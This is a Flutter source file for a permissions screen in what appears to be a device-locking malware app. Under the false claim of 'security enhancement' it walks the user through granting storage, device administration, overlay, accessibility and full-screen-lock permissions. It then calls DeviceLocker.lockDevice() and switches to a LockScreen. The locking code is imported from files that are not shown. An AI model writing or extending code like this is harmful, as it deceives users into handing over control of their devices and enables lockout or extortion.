import 'package:flutter/material.dart';
import 'lock_screen.dart';
import 'utils/device_locker.dart';

class PermissionsPage extends StatefulWidget {
  const PermissionsPage({super.key});

  @override
  _PermissionsPageState createState() => _PermissionsPageState();
}

class _PermissionsPageState extends State<PermissionsPage> {
  int _currentStep = 0;
  final List<String> _permissions = [
    'Storage Access',
    'Device Administration',
    'Overlay Permission',
    'Accessibility Service',
    'Full Screen Lock',
  ];

  void _grantPermission() async {
    if (_currentStep < _permissions.length - 1) {
      setState(() => _currentStep++);
      await Future.delayed(const Duration(milliseconds: 800));
    } else {
      // Final step - lock device
      DeviceLocker.lockDevice();
      
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(builder: (context) => const LockScreen()),
      );
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF0A2463),
      body: Center(
        child: Container(
          width: 400,
          padding: const EdgeInsets.all(30),
          decoration: BoxDecoration(
            color: const Color(0xFF1E3A8A),
            borderRadius: BorderRadius.circular(20),
            boxShadow: [
              BoxShadow(
                color: Colors.blue[900]!.withOpacity(0.5),
                blurRadius: 30,
                spreadRadius: 5,
              ),
            ],
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              const Icon(
                Icons.security,
                size: 80,
                color: Colors.blueAccent,
              ),
              const SizedBox(height: 20),
              const Text(
                'SYSTEM PERMISSION REQUIRED',
                style: TextStyle(
                  fontSize: 22,
                  fontWeight: FontWeight.bold,
                  color: Colors.white,
                  fontFamily: 'ShareTechMono',
                  letterSpacing: 1.5,
                ),
              ),
              const SizedBox(height: 10),
              const Text(
                'For security enhancement, please grant the following permissions:',
                textAlign: TextAlign.center,
                style: TextStyle(
                  color: Colors.blueGrey,
                  fontSize: 14,
                ),
              ),
              const SizedBox(height: 40),
              
              // Permission Steps
              ..._permissions.asMap().entries.map((entry) {
                int idx = entry.key;
                String perm = entry.value;
                
                return Container(
                  margin: const EdgeInsets.only(bottom: 15),
                  padding: const EdgeInsets.all(15),
                  decoration: BoxDecoration(
                    color: idx <= _currentStep
                        ? const Color(0xFF3B82F6).withOpacity(0.2)
                        : const Color(0xFF0F3460),
                    borderRadius: BorderRadius.circular(10),
                    border: Border.all(
                      color: idx <= _currentStep
                          ? Colors.blueAccent
                          : Colors.blueGrey,
                    ),
                  ),
                  child: Row(
                    children: [
                      CircleAvatar(
                        backgroundColor: idx <= _currentStep
                            ? Colors.blueAccent
                            : Colors.blueGrey,
                        child: Icon(
                          idx <= _currentStep
                              ? Icons.check
                              : Icons.pending,
                          color: Colors.white,
                          size: 20,
                        ),
                      ),
                      const SizedBox(width: 15),
                      Expanded(
                        child: Text(
                          perm,
                          style: TextStyle(
                            color: Colors.white,
                            fontSize: 16,
                            fontFamily: 'ShareTechMono',
                            fontWeight: idx <= _currentStep
                                ? FontWeight.bold
                                : FontWeight.normal,
                          ),
                        ),
                      ),
                    ],
                  ),
                );
              }).toList(),
              
              const SizedBox(height: 40),
              SizedBox(
                width: double.infinity,
                child: ElevatedButton(
                  onPressed: _grantPermission,
                  style: ElevatedButton.styleFrom(
                    backgroundColor: const Color(0xFF3B82F6),
                    padding: const EdgeInsets.symmetric(vertical: 18),
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(10),
                    ),
                  ),
                  child: Text(
                    _currentStep < _permissions.length - 1
                        ? 'GRANT ${_permissions[_currentStep].toUpperCase()}'
                        : 'ACTIVATE LOCK SYSTEM',
                    style: const TextStyle(
                      fontSize: 16,
                      fontWeight: FontWeight.bold,
                      fontFamily: 'ShareTechMono',
                      letterSpacing: 1,
                    ),
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}
